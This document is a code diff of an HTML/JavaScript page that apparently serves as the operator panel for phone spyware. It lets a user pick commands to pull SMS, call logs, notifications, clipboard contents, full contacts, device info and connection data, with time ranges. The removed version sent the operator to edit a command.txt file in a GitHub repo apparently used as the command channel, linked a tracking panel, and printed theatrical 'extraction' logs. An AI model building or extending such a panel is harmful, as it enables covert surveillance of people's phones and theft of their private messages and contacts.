@@ -1,100 +1,98 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>RKP ROOT ACCESS</title>
+<title>Command Executor</title>
 
 <link rel="stylesheet" href="styles.css">
 
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-
 </head>
+
 <body>
 
 
-<canvas id="matrix"></canvas>
+<div class="container">
 
-
-<div class="terminal">
-
-<div class="header">
-
-<div class="title">ROOT ACCESS :: RKP EXECUTOR</div>
-
-<button class="contact-btn"
-onclick="window.open('https://rahulpuri.fun/RKP-ControlPanel/Tracking/','_blank')">
-TRACKING
-</button>
-
+<div class="title">
+Command Executor
 </div>
 
 
-
-<!-- COMMAND LIST -->
 <div class="commands">
 
-<div class="command popup-trigger" data-base="apps">📱 apps</div>
+<div class="command popup-btn" data-base="apps">
+apps
+</div>
 
-<div class="command popup-trigger" data-base="apps installed">📦 apps installed</div>
+<div class="command popup-btn" data-base="apps installed">
+apps installed
+</div>
 
-<div class="command popup-trigger" data-base="sms">💬 sms</div>
+<div class="command popup-btn" data-base="sms">
+sms
+</div>
 
-<div class="command popup-trigger" data-base="calls">📞 calls</div>
+<div class="command popup-btn" data-base="calls">
+calls
+</div>
 
-<div class="command popup-trigger" data-base="notification">🔔 notification</div>
+<div class="command popup-btn" data-base="notification">
+notification
+</div>
 
-<div class="command popup-trigger" data-base="clipboard">📋 clipboard</div>
+<div class="command popup-btn" data-base="clipboard">
+clipboard
+</div>
 
 
-<div class="command" data-cmd="contacts full">👤 contacts full</div>
+<div class="command direct" data-cmd="contacts full">
+contacts
+</div>
 
-<div class="command" data-cmd="deviceinfo">ℹ️ deviceinfo</div>
+<div class="command direct" data-cmd="deviceinfo">
+device info
+</div>
 
-<div class="command" data-cmd="connection">🌐 connection</div>
+<div class="command direct" data-cmd="connection">
+connection
+</div>
 
-<div class="command" data-cmd="none">🚫 none</div>
+<div class="command direct" data-cmd="none">
+none
+</div>
+
 
 </div>
 
 
-
-<div class="output" id="output"></div>
-
-<div class="run-panel" id="runPanel">
-
-<button class="run-btn" onclick="runSelected()">
-EXECUTE SEQUENCE
+<button class="run-btn" onclick="execute()">
+EXECUTE
 </button>
 
-</div>
 
 </div>
 
 
 
 <!-- POPUP -->
-<div id="rangePopup" class="popup">
+
+<div class="popup" id="popup">
 
 <div class="popup-box">
 
-<div class="popup-title">SELECT RANGE</div>
+<div>Select Range</div>
 
-<div class="popup-options">
+<button onclick="selectRange('full')">Full</button>
 
-<button onclick="selectRange('full')">FULL</button>
+<button onclick="selectRange('1d')">1 Day</button>
 
-<button onclick="selectRange('1d')">1 DAY</button>
+<button onclick="selectRange('7d')">7 Days</button>
 
-<button onclick="selectRange('7d')">7 DAYS</button>
+<button onclick="selectRange('30d')">30 Days</button>
 
-<button onclick="selectRange('30d')">30 DAYS</button>
-
-</div>
-
-<button class="popup-close" onclick="closePopup()">CLOSE</button>
+<button onclick="closePopup()">Cancel</button>
 
 </div>
 
@@ -105,243 +103,21 @@ EXECUTE SEQUENCE
 <script>
 
 
-/* ================= MATRIX ================= */
+let selected = new Set();
 
-const canvas=document.getElementById('matrix');
-const ctx=canvas.getContext('2d');
+let currentBase = "";
 
-let fontSize=14;
-let columns;
-let drops;
+const popup = document.getElementById("popup");
 
-const chars="01アカサタナハマヤラワ";
 
-function init(){
 
-canvas.width=window.innerWidth;
-canvas.height=window.innerHeight;
+/* POPUP BUTTONS */
 
-columns=Math.floor(canvas.width/fontSize);
+document.querySelectorAll(".popup-btn").forEach(btn=>{
 
-drops=Array(columns).fill(1);
+btn.onclick=function(){
 
-}
-
-function draw(){
-
-ctx.fillStyle='rgba(0,0,0,0.05)';
-ctx.fillRect(0,0,canvas.width,canvas.height);
-
-ctx.fillStyle='#00ffcc';
-ctx.font=fontSize+"px monospace";
-
-for(let i=0;i<drops.length;i++){
-
-const text=chars[Math.floor(Math.random()*chars.length)];
-
-ctx.fillText(text,i*fontSize,drops[i]*fontSize);
-
-if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
-drops[i]=0;
-
-drops[i]++;
-
-}
-
-}
-
-init();
-setInterval(draw,50);
-
-
-
-/* ================= TERMINAL ENGINE ================= */
-
-const output=document.getElementById("output");
-
-const runPanel=document.getElementById("runPanel");
-
-let selected=new Set();
-
-let alreadyExecuted=new Set();
-
-let queue=[];
-
-let typing=false;
-
-const TYPE_SPEED=6;
-
-const redirectURL="https://github.com/MOFO-UG/ControlTheWorld/edit/main/command.txt";
-
-
-
-const logDB={
-
-apps:[
-"[+] Scanning installed APPS...",
-"[+] Reading APP registry...",
-"[+] Extracting APP metadata...",
-"[+] APP scan complete"
-],
-
-sms:[
-"[+] Locating SMS database...",
-"[+] Decrypting SMS storage...",
-"[+] Extracting SMS records...",
-"[+] SMS extraction complete"
-],
-
-calls:[
-"[+] Accessing CALL interface...",
-"[+] Reading CALL logs...",
-"[+] CALL extraction complete"
-],
-
-notification:[
-"[+] Accessing NOTIFICATION service...",
-"[+] Reading NOTIFICATION buffer...",
-"[+] NOTIFICATION capture complete"
-],
-
-clipboard:[
-"[+] Accessing CLIPBOARD service...",
-"[+] Reading clipboard buffer...",
-"[+] Clipboard extraction complete"
-],
-
-contacts:[
-"[+] Accessing CONTACT database...",
-"[+] CONTACT extraction complete"
-],
-
-deviceinfo:[
-"[+] Reading DEVICE kernel...",
-"[+] DEVICE scan complete"
-],
-
-connection:[
-"[+] Reading network interfaces...",
-"[+] Connection upload complete"
-],
-
-none:[
-"[+] Null sequence initialized..."
-]
-
-};
-
-
-
-function updateExecuteButton(){
-
-if(typing)
-runPanel.style.display="none";
-else
-runPanel.style.display=selected.size?"block":"none";
-
-}
-
-
-
-function addLogs(cmd){
-
-if(alreadyExecuted.has(cmd))return;
-
-alreadyExecuted.add(cmd);
-
-let base=getBase(cmd);
-
-if(logDB[base])
-logDB[base].forEach(log=>queue.push(log));
-
-if(!typing)
-typeNext();
-
-}
-
-
-
-function getBase(cmd){
-
-if(cmd.startsWith("apps")) return "apps";
-
-if(cmd.startsWith("sms")) return "sms";
-
-if(cmd.startsWith("calls")) return "calls";
-
-if(cmd.startsWith("notification")) return "notification";
-
-if(cmd.startsWith("clipboard")) return "clipboard";
-
-if(cmd.startsWith("contacts")) return "contacts";
-
-if(cmd.startsWith("deviceinfo")) return "deviceinfo";
-
-if(cmd.startsWith("connection")) return "connection";
-
-return "none";
-
-}
-
-
-
-function typeNext(){
-
-if(queue.length===0){
-
-typing=false;
-
-updateExecuteButton();
-
-return;
-
-}
-
-typing=true;
-
-updateExecuteButton();
-
-let text=queue.shift();
-
-let line=document.createElement("div");
-
-output.appendChild(line);
-
-let i=0;
-
-function type(){
-
-if(i<text.length){
-
-line.textContent+=text[i++];
-
-output.scrollTop=output.scrollHeight;
-
-setTimeout(type,TYPE_SPEED);
-
-}
-
-else typeNext();
-
-}
-
-type();
-
-}
-
-
-
-/* ================= POPUP SYSTEM ================= */
-
-let popupBase=null;
-
-const popup=document.getElementById("rangePopup");
-
-document.querySelectorAll(".popup-trigger").forEach(btn=>{
-
-btn.onclick=()=>{
-
-popupBase=btn.dataset.base;
+currentBase = this.dataset.base;
 
 popup.style.display="flex";
 
@@ -350,6 +126,35 @@ popup.style.display="flex";
 });
 
 
+/* DIRECT BUTTONS */
+
+document.querySelectorAll(".direct").forEach(btn=>{
+
+btn.onclick=function(){
+
+toggle(this.dataset.cmd,this);
+
+};
+
+});
+
+
+/* SELECT RANGE */
+
+function selectRange(range){
+
+let cmd = currentBase + " " + range;
+
+let btn = findButton(currentBase);
+
+toggle(cmd,btn);
+
+popup.style.display="none";
+
+}
+
+
+/* CLOSE POPUP */
 
 function closePopup(){
 
@@ -358,75 +163,58 @@ popup.style.display="none";
 }
 
 
+/* TOGGLE */
 
-function selectRange(range){
-
-closePopup();
-
-let cmd = popupBase + " " + range;
-
-toggleCommand(cmd);
-
-}
-
-
-
-/* ================= COMMAND TOGGLE ================= */
-
-function toggleCommand(cmd){
+function toggle(cmd,btn){
 
 if(selected.has(cmd)){
 
 selected.delete(cmd);
 
-}
+btn.classList.remove("selected");
 
+}
 else{
 
 selected.add(cmd);
 
-addLogs(cmd);
+btn.classList.add("selected");
 
 }
-
-updateExecuteButton();
-
-}
-
-
-
-/* ================= EXECUTE ================= */
-
-function runSelected(){
-
-if(selected.size===0)return;
-
-const outputText=[...selected].join(", ");
-
-navigator.clipboard.writeText(outputText).then(()=>{
-
-queue.push("root@RKPexecutor:~# executing root sequence...");
-
-if(!typing)
-typeNext();
-
-setTimeout(()=>{
-
-window.open(redirectURL,'_blank');
-
-},1000);
-
-});
 
 }
 
 
+/* FIND BUTTON */
 
-/* ================= START ================= */
+function findButton(base){
 
-queue.push("root@RKPexecutor:~# _");
+return document.querySelector(
+`[data-base="${base}"]`
+);
 
-typeNext();
+}
+
+
+/* EXECUTE */
+
+function execute(){
+
+if(selected.size===0){
+
+alert("No command selected");
+
+return;
+
+}
+
+let cmd = Array.from(selected).join(", ");
+
+navigator.clipboard.writeText(cmd);
+
+alert("Command copied:\n\n"+cmd);
+
+}
 
 
 </script>
